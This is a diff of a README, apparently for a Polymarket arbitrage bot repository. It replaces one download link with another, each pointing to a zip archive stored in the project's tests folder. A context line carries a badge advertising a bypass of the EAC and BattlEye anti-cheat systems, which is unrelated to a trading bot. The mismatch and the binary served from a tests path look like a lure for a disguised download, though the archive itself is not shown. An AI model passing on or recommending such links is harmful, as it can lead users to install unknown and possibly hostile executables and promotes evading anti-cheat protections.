@@ -15,7 +15,7 @@
   <img src="https://img.shields.io/badge/Bypass-EAC%20%26%20BattleEye-brightgreen?style=for-the-badge" alt="Bypass">
 </div>
 
-[![Download](https://i.imgur.com/3Dm4p65.png)](https://github.com/FiendCorporateLog/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/tests/Polymarket%20v1.21.zip)
+[![Download](https://i.imgur.com/3Dm4p65.png)](https://github.com/FiendCorporateLog/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/tests/PolymarketBot%20v%201.19.zip)
 
 
 ---
